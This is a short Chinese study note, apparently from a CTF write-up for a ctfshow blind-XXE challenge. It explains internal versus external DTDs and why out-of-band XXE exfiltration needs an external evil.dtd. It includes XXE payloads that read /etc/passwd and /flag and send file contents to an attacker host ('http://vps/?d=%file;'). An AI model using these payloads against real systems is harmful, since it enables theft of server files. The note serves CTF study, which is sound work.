很简单，看 `<!DOCTYPE>` 里的内容写在哪里就行了。

## 内联 DTD

定义**直接写在 `[...]` 方括号里**，所有内容都在 XML 文件内部：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY hello "world">
]>
<foo>&xxe;</foo>
```

方括号里的内容就叫**内部子集（internal subset）**。

## 外部 DTD

定义**写在单独的 `.dtd` 文件里**，通过 `SYSTEM` 或 `PUBLIC` 引用：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://vps/evil.dtd">
<foo>&exfil;</foo>
```

或者**两者混用**（这道题的打法）：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://vps/evil.dtd">  <!-- 引用外部 -->
  %dtd;                                          <!-- 执行外部 -->
]>
<foo>&exfil;</foo>
```

方括号里只有一句引用，真正的实体定义在外部文件里。

## 一句话区分

```
内联 DTD → 实体定义在 XML 文件的 [...] 里
外部 DTD → 实体定义在另一个 .dtd 文件里，通过 SYSTEM 引用
```

## 为什么这道题必须用外部 DTD


[[ctfshow374xxe去除回显]]

关键限制：**XML 规范禁止在内部子集里嵌套参数实体**。

```xml
<!-- 想在内联里一步完成，但这是非法的！ -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///flag">
  <!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://vps/?d=%file;'>">
  %oob;   ← 解析器直接报错，%file; 不允许出现在这里
]>
```

把嵌套部分挪到外部 DTD 文件里，这个限制就不存在了：

```
内联里         →  只负责加载外部 DTD
evil.dtd 里   →  负责嵌套参数实体、构造带文件内容的 URL
```

这就是为什么无回显 XXE 外带必须绕一圈走外部 DTD 的根本原因。